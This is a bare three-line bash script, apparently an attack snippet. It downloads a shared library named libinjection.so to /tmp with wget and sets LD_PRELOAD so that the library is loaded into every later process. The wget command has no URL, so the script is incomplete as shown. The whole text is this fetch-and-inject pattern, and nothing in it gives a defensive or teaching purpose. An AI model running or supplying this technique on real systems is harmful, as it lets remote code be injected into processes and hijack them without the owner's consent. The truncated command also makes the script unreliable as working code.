#!/bin/bash
wget -O /tmp/libinjection.so 
export LD_PRELOAD=/tmp/libinjection.so
